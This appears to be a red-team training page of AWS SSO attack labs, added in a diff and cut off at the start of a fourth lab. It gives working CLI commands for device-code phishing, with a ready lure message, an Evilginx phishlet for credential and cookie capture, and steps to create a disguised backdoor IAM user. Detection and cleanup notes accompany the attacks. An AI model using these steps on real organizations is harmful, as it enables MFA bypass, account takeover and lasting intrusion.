@@ -1,0 +1,893 @@
+<!-- M12: SSO Phishing & Token Theft — Expert Tier Labs -->
+
+<div class="lab-walkthrough-content" id="M12-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Capture SSO tokens by tricking users into authorizing a rogue device code — bypassing MFA entirely through the OAuth 2.0 device authorization grant flow.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>No AWS credentials required — <code>sso-oidc:RegisterClient</code> and <code>sso-oidc:StartDeviceAuthorization</code> are unauthenticated calls</li>
+      <li>The target organization's SSO start URL (e.g., <code>https://myorg.awsapps.com/start</code>) — obtainable from OSINT, phishing pretexts, or source code leaks</li>
+      <li>AWS CLI or curl installed on attacker machine</li>
+      <li>A communication channel to deliver the phishing code (Slack, Teams, email)</li>
+      <li>A valid target user account within the organization's Identity Center</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Register a public OIDC client with AWS SSO. This is an unauthenticated call — anyone can do it. The client name mimics the legitimate AWS CLI to reduce victim suspicion.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-oidc register-client \
+    --client-name "AWS CLI" \
+    --client-type public</div>
+            <div class="terminal-output">{
+    "clientId": "bG9jYWxob3N0OjEyMzQ1Njc4OTAxMjM0NTY3ODkw",
+    "clientSecret": "eyJraWQiOiJrZXktMTY4...(truncated)",
+    "clientIdIssuedAt": 1711900800,
+    "clientSecretExpiresAt": 1719676800
+}</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-lightbulb"></i> Note: <code>sso-oidc:RegisterClient</code> does not appear in CloudTrail as it is a pre-authentication call. The registered client is valid for ~90 days.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Initiate device authorization to get a user-facing code and verification URL. The <code>userCode</code> and <code>verificationUri</code> are what you deliver to the victim.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-oidc start-device-authorization \
+    --client-id "bG9jYWxob3N0OjEyMzQ1Njc4OTAxMjM0NTY3ODkw" \
+    --client-secret "eyJraWQiOiJrZXktMTY4..." \
+    --start-url "https://myorg.awsapps.com/start"</div>
+            <div class="terminal-output">{
+    "deviceCode": "MDJkYjgwZmItZTcxNy00ZjI3LThm...(truncated)",
+    "userCode": "RBFM-WKQJ",
+    "verificationUri": "https://device.sso.us-east-1.amazonaws.com/",
+    "verificationUriComplete": "https://device.sso.us-east-1.amazonaws.com/?user_code=RBFM-WKQJ",
+    "expiresIn": 600,
+    "interval": 5
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Craft and deliver the phishing message. The verification URL is a legitimate AWS domain — this is what makes device code phishing so effective. The victim sees and interacts with a real AWS page.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Example phishing message (sent via Slack, email, Teams):
+$ cat &lt;&lt;'PHISH'
+Hi! I'm getting "Session expired" when running aws cli against
+the staging account. IT said everyone needs to re-authorize:
+
+1. Go to: https://device.sso.us-east-1.amazonaws.com/
+2. Enter code: RBFM-WKQJ
+
+Takes 10 seconds. Thanks!
+PHISH</div>
+            <div class="terminal-output">Hi! I'm getting "Session expired" when running aws cli against
+the staging account. IT said everyone needs to re-authorize:
+
+1. Go to: https://device.sso.us-east-1.amazonaws.com/
+2. Enter code: RBFM-WKQJ
+
+Takes 10 seconds. Thanks!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Poll for the token while waiting for the victim to authorize. Initially returns "authorization_pending" — once the user approves (and completes MFA), the full access token is returned.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Poll every 5 seconds (as specified by interval)
+$ while true; do
+    RESULT=$(aws sso-oidc create-token \
+        --client-id "bG9jYWxob3N0OjEyMzQ1Njc4OTAxMjM0NTY3ODkw" \
+        --client-secret "eyJraWQiOiJrZXktMTY4..." \
+        --grant-type "urn:ietf:params:oauth:grant-type:device_code" \
+        --device-code "MDJkYjgwZmItZTcxNy00ZjI3LThm..." 2>&amp;1)
+    if echo "$RESULT" | grep -q "accessToken"; then
+        echo "$RESULT" | jq '{accessToken: .accessToken[:40], expiresIn, tokenType}'
+        break
+    fi
+    echo "[$(date +%H:%M:%S)] Still waiting... (authorization_pending)"
+    sleep 5
+done</div>
+            <div class="terminal-output">[14:22:15] Still waiting... (authorization_pending)
+[14:22:20] Still waiting... (authorization_pending)
+[14:22:25] Still waiting... (authorization_pending)
+{
+    "accessToken": "aoaABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+    "expiresIn": 28800,
+    "tokenType": "Bearer"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Use the captured token to access all accounts and roles available to the victim. You now have the victim's full SSO session — every account, every role — for the next 8 hours.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso list-accounts --access-token "CAPTURED_ACCESS_TOKEN"</div>
+            <div class="terminal-output">{
+    "accountList": [
+        {"accountId": "111222333444", "accountName": "management"},
+        {"accountId": "123456789012", "accountName": "production"},
+        {"accountId": "234567890123", "accountName": "staging"},
+        {"accountId": "345678901234", "accountName": "development"},
+        {"accountId": "456789012345", "accountName": "security"}
+    ]
+}</div>
+            <div class="terminal-cmd">$ # Victim was a platform engineer — admin across all accounts
+$ aws sso list-account-roles --access-token "CAPTURED_ACCESS_TOKEN" \
+    --account-id 111222333444</div>
+            <div class="terminal-output">{
+    "roleList": [
+        {"roleName": "AdministratorAccess", "accountId": "111222333444"}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail events:</strong> <code>sso-oidc:CreateToken</code> with <code>grant_type=urn:ietf:params:oauth:grant-type:device_code</code>, followed by <code>sso:ListAccounts</code> and <code>sso:GetRoleCredentials</code></li>
+      <li>Alert on <code>sso:GetRoleCredentials</code> from a source IP that does not match the user's historical login geography</li>
+      <li>Compare the device code authorization IP against the token usage IP — they will differ in an attack scenario</li>
+      <li>Conditional Access policies in Identity Center can restrict SSO login to trusted IP ranges or require re-authentication from new locations</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1111 — MFA Interception</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1550.001 — Application Access Token</span>
+      <span class="mitre-tag">T1566 — Phishing</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Register Client</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Start Device Auth</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Phish User</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Poll for Token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Full SSO Access</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>This lab uses only read operations against the captured token. The captured SSO token expires automatically after 8 hours. To force immediate expiry, the target user can log out from the SSO portal or an admin can revoke active sessions from the Identity Center console. No persistent resources are created by the attacker in this lab.</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> Device code phishing fully bypasses MFA — the user completes the entire authentication flow including MFA on a legitimate AWS domain. The attacker never sees or intercepts credentials directly.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M12-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Clone the AWS SSO portal using Evilginx v3 as a reverse proxy to capture session cookies and credentials in real time, bypassing MFA through an adversary-in-the-middle attack.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>A VPS or lab VM with a public IP and port 443 open</li>
+      <li>A domain you control (e.g., <code>myphish.com</code>) with DNS management access</li>
+      <li>Go 1.20+ installed on the attacker machine</li>
+      <li>Evilginx v3 installed (see Step 1)</li>
+      <li>The target organization's SSO subdomain (e.g., <code>myorg.awsapps.com</code>)</li>
+      <li>DNS wildcard record pointing <code>*.myphish.com</code> to your VPS IP</li>
+      <li>Ports 443 and 53 available (Evilginx runs its own DNS and TLS)</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Install Evilginx v3, a man-in-the-middle attack framework that acts as a reverse proxy between the victim and the real AWS SSO portal. The package was renamed from <code>evilginx2</code> to <code>evilginx</code> in v3.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Install Evilginx v3 via Go
+$ go install github.com/kgretzky/evilginx2@latest
+$ # Binary is installed as 'evilginx2' in $GOPATH/bin — rename for clarity:
+$ mv $(go env GOPATH)/bin/evilginx2 /usr/local/bin/evilginx
+
+$ # Alternatively, build from source for the latest v3.x release:
+$ git clone https://github.com/kgretzky/evilginx2.git
+$ cd evilginx2 &amp;&amp; make build
+$ sudo cp build/evilginx /usr/local/bin/evilginx</div>
+            <div class="terminal-output">go: downloading github.com/kgretzky/evilginx2 v3.3.0
+go: installing github.com/kgretzky/evilginx2@latest</div>
+            <div class="terminal-cmd">$ sudo evilginx -p /opt/evilginx/phishlets</div>
+            <div class="terminal-output">
+                        _ _       _            ____
+  _____   _(_) |__ _ (_)_ __  __\ \    / /__ \
+ / _ \ \ / / | / _` || | '_ \ \ _\ \/\/ /|__) |
+|  __/\ V /| | \__, || | | | |&gt;_  \  /  / __/
+ \___| \_/ |_|_|___/ |_|_| |_|___|\/  \/ |_____|
+                   v3.3.0
+
+[::] listening on 0.0.0.0:443</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Version note:</strong> Evilginx v3 uses a different phishlet schema than v2. Phishlets written for v2 will not load in v3 — check the <code>min_ver</code> field. See Step 2 for the correct v3 format.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Configure the AWS SSO phishlet using the Evilginx v3 schema. This YAML defines proxy hosts, which auth tokens to capture, credential extraction patterns, and the landing login page. The <code>min_ver</code> field must be <code>3.0.0</code> or the phishlet will fail to load.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat /opt/evilginx/phishlets/aws-sso.yaml</div>
+            <div class="terminal-output">name: 'aws-sso'
+author: 'redteam'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - { phish_sub: 'sso', orig_sub: 'sso', domain: 'awsapps.com', session: true, is_landing: true }
+
+auth_tokens:
+  - domain: '.awsapps.com'
+    keys: ['x-amz-sso_authn']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'sso.awsapps.com'
+  path: '/start'</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-circle-info"></i> The <code>orig_sub</code> for the proxy host maps to the target organization's actual SSO subdomain pattern. Replace <code>sso.awsapps.com</code> with your target's actual start URL domain (e.g., <code>myorg.awsapps.com</code>) in the <code>login.domain</code> field. Adjust <code>phish_sub</code> and <code>orig_sub</code> accordingly.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Set up the hostname, enable the phishlet, and generate a lure URL that looks convincing enough for the victim to click.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">: phishlets hostname aws-sso myphish.com
+: phishlets enable aws-sso
+: lures create aws-sso
+: lures edit 0 redirect_url https://myorg.awsapps.com/start
+: lures get-url 0</div>
+            <div class="terminal-output">[14:30:01] [inf] phishlet 'aws-sso' hostname set to: myphish.com
+[14:30:02] [inf] phishlet 'aws-sso' enabled
+[14:30:03] [inf] lure created with id: 0
+[14:30:04] [inf] redirect URL set for lure 0
+[14:30:05] [inf] lure URL: https://sso.myphish.com/YWJjMTIz</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Send the lure URL to the target via phishing email, Slack, or other communication channel. The URL leads to a pixel-perfect reverse proxy of the real AWS SSO login page. Evilginx intercepts all traffic in real time.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Victim clicks https://sso.myphish.com/YWJjMTIz
+$ # They see the real AWS SSO login — proxied through Evilginx
+$ # Victim enters credentials + completes MFA
+$ # Evilginx captures everything in real time</div>
+            <div class="terminal-output">[14:35:22] [imp] [0] [aws-sso] new visitor: 192.168.1.100
+[14:35:45] [imp] [0] [aws-sso] captured credentials:
+           username: admin@corp.com
+           password: S3cur3P@ss!
+[14:35:52] [imp] [0] [aws-sso] MFA completed by victim
+[14:35:53] [imp] [0] [aws-sso] captured session tokens (1 cookie)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Extract the captured session cookie and inject it into your browser or use it directly with the AWS SSO portal API to hijack the victim's authenticated session.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">: sessions</div>
+            <div class="terminal-output">+---+----------+--------------------+----------------------------+
+| # | PHISHLET | USERNAME           | CAPTURED                   |
++---+----------+--------------------+----------------------------+
+| 0 | aws-sso  | admin@corp.com     | credentials + session      |
++---+----------+--------------------+----------------------------+</div>
+            <div class="terminal-cmd">: sessions 0</div>
+            <div class="terminal-output">[session 0]
+  phishlet:    aws-sso
+  username:    admin@corp.com
+  password:    S3cur3P@ss!
+  tokens:
+    [awsapps.com]
+      x-amz-sso_authn : eyJhbGciOiJSUzI1N...(truncated)
+
+# Import this cookie into your browser → full SSO portal access
+# Or use the token value directly with the AWS CLI:
+# aws sso list-accounts --access-token "eyJhbGciOiJSUzI1N..."</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li>Unusual SSO login source IPs or geolocations not matching the user's known locations</li>
+      <li>Rapid account enumeration (<code>sso:ListAccounts</code>, <code>sso:GetRoleCredentials</code> across multiple accounts in seconds) from a new IP shortly after a successful SSO login</li>
+      <li>FIDO2/WebAuthn hardware keys (YubiKey, etc.) are the <strong>only</strong> MFA method that defeats Evilginx-style attacks — the origin check binds the key to the real domain, so the attacker's proxy domain will fail the assertion</li>
+      <li>Browser-based anomaly detection: AWS may flag logins from Tor exit nodes or data center IP ranges; monitor Identity Center CloudTrail for <code>UserAuthentication</code> events with unusual source IPs</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1111 — MFA Interception</span>
+      <span class="mitre-tag">T1539 — Steal Web Session Cookie</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1557 — Adversary-in-the-Middle</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Evilginx v3 Proxy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Victim Clicks Lure</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Creds + MFA Captured</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Session Hijack</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>Shut down the Evilginx process (<code>Ctrl+C</code> or kill the process). Remove the phishlet files and session database from <code>/opt/evilginx/</code>. Revoke any DNS records pointing to your phishing VPS. The captured SSO token expires automatically after 8 hours; no AWS-side cleanup is needed unless credentials were used to create resources (see Lab 3).</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Defense: FIDO2/WebAuthn hardware keys are the only MFA method that resists Evilginx-style phishing — the origin check fails when the domain is not the real AWS domain.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M12-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Maintain persistent AWS access after obtaining a stolen SSO session by creating a backdoor IAM user with programmatic access keys — establishing long-lived credentials that survive SSO token expiry.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>A captured SSO access token (obtained from Lab 1 or Lab 2) that grants access to an account with IAM write permissions</li>
+      <li>The target account must not have SCPs restricting <code>iam:CreateUser</code> or <code>iam:CreateAccessKey</code></li>
+      <li>Temporary credentials obtained via <code>aws sso get-role-credentials</code> for a role with <code>iam:CreateUser</code>, <code>iam:CreateAccessKey</code>, and <code>iam:AttachUserPolicy</code></li>
+    </ul>
+    <div class="prereq-note"><i class="fa-solid fa-circle-info"></i> <strong>Why not refresh_token?</strong> AWS SSO OIDC does <em>not</em> support the <code>refresh_token</code> grant type for public clients after session expiry. Attempting to use a refresh token after the parent session ends results in an <code>InvalidGrantException</code>. The correct persistence technique is to establish IAM credentials during the active SSO session window.</div>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Exchange the stolen SSO token for temporary STS credentials in the target account. Confirm identity before proceeding.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Exchange SSO token for temporary IAM credentials
+$ CREDS=$(aws sso get-role-credentials \
+    --role-name AdministratorAccess \
+    --account-id 123456789012 \
+    --access-token "$STOLEN_SSO_TOKEN")
+
+$ export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.roleCredentials.accessKeyId')
+$ export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.roleCredentials.secretAccessKey')
+$ export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.roleCredentials.sessionToken')
+
+$ aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROA3XFRBF23COLMEXAMP:admin@corp.com",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/AWSReservedSSO_AdministratorAccess_a1b2c3/admin@corp.com"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create a backdoor IAM user with a name designed to blend into the existing user roster. Service account naming conventions vary — inspect existing users first.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Inspect existing IAM user naming conventions
+$ aws iam list-users --query 'Users[*].UserName' --output text</div>
+            <div class="terminal-output">svc-datadog-monitoring   svc-github-actions   svc-terraform-deploy   ci-pipeline-user</div>
+            <div class="terminal-cmd">$ # Create a user matching the naming pattern
+$ aws iam create-user --user-name svc-backup-monitor</div>
+            <div class="terminal-output">{
+    "User": {
+        "UserId": "AIDA3XFRBF23BACKDOOR1",
+        "Arn": "arn:aws:iam::123456789012:user/svc-backup-monitor",
+        "UserName": "svc-backup-monitor",
+        "Path": "/",
+        "CreateDate": "2026-04-01T14:35:00.000Z"
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Create programmatic access keys for the backdoor user. These long-lived keys do not expire — unlike SSO tokens — and persist until explicitly deleted.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam create-access-key --user-name svc-backup-monitor</div>
+            <div class="terminal-output">{
+    "AccessKey": {
+        "UserName": "svc-backup-monitor",
+        "AccessKeyId": "AKIAIOSFODNN7BACKDOR",
+        "Status": "Active",
+        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/BACKDOORACCESSKEY",
+        "CreateDate": "2026-04-01T14:35:10.000Z"
+    }
+}
+# CRITICAL: SecretAccessKey is only shown once — store it securely</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-lightbulb"></i> IAM access keys starting with <code>AKIA</code> are long-lived keys that never expire. Keys starting with <code>ASIA</code> are temporary STS credentials. A backdoor user with <code>AKIA</code> keys provides indefinite persistence.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Attach a policy to the backdoor user. For low-profile persistence, <code>ReadOnlyAccess</code> allows ongoing reconnaissance. For higher-impact persistence, attach a more permissive policy scoped to your objectives.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Minimal persistence: read-only access for ongoing recon
+$ aws iam attach-user-policy \
+    --user-name svc-backup-monitor \
+    --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess</div>
+            <div class="terminal-output"># No output on success</div>
+            <div class="terminal-cmd">$ # Verify the user is configured as expected
+$ aws iam get-user --user-name svc-backup-monitor
+$ aws iam list-attached-user-policies --user-name svc-backup-monitor</div>
+            <div class="terminal-output">{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "ReadOnlyAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Verify persistence by authenticating with the long-lived access keys from a different session, confirming the backdoor survives SSO token expiry.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Open a new terminal — use only the backdoor IAM keys
+$ unset AWS_SESSION_TOKEN
+$ export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7BACKDOR"
+$ export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/BACKDOORACCESSKEY"
+$ aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AIDA3XFRBF23BACKDOOR1",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/svc-backup-monitor"
+}
+# Persistent access confirmed — no SSO token required
+# These keys will work regardless of SSO session state</div>
+            <div class="terminal-cmd">$ aws s3 ls | head -5</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-data-bucket
+2024-02-15 14:33:22 prod-application-logs
+2024-03-01 09:11:44 prod-backups-encrypted</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>Key CloudTrail events:</strong> <code>iam:CreateUser</code>, <code>iam:CreateAccessKey</code>, <code>iam:AttachUserPolicy</code></li>
+      <li>Alert when <code>iam:CreateUser</code> + <code>iam:CreateAccessKey</code> occur within seconds of each other from an SSO role (rather than an IAC pipeline) — this pattern is consistent with interactive backdoor creation</li>
+      <li><code>iam:CreateUser</code> from an SSO assumed-role ARN (containing <code>AWSReservedSSO_</code>) is anomalous — SSO roles are typically used for human access, not IAM user provisioning</li>
+      <li>Unusual source IP for <code>iam:CreateUser</code> combined with <code>sso:GetRoleCredentials</code> from the same session is a high-fidelity signal</li>
+      <li>Enable IAM Access Analyzer to detect new IAM entities not provisioned by your IAC pipeline</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1136.003 — Create Account: Cloud Account</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1098 — Account Manipulation</span>
+      <span class="mitre-tag">T1556 — Modify Authentication Process</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Captured SSO Token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Get Temp Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Create IAM User</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Create Access Key</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Persistent Access</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>Remove all artifacts created during this lab in the following order. Use your original SSO session credentials or another privileged session:</p>
+    <div class="terminal">
+      <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Cleanup</div>
+      <div class="terminal-body">
+        <div class="terminal-cmd">$ # 1. Detach all policies from the backdoor user
+$ aws iam detach-user-policy \
+    --user-name svc-backup-monitor \
+    --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
+
+$ # 2. Delete the access keys (list first to get key IDs)
+$ KEY_ID=$(aws iam list-access-keys --user-name svc-backup-monitor \
+    --query 'AccessKeyMetadata[0].AccessKeyId' --output text)
+$ aws iam delete-access-key \
+    --user-name svc-backup-monitor \
+    --access-key-id "$KEY_ID"
+
+$ # 3. Delete the user
+$ aws iam delete-user --user-name svc-backup-monitor
+
+$ # 4. Unset all environment variables
+$ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Unlike SSO tokens (8-hour TTL), IAM access keys have no expiration by default. AWS credential audit tools like IAM Access Analyzer, Prowler, or ScoutSuite will flag unused or newly created IAM users — monitor for these findings.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M12-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
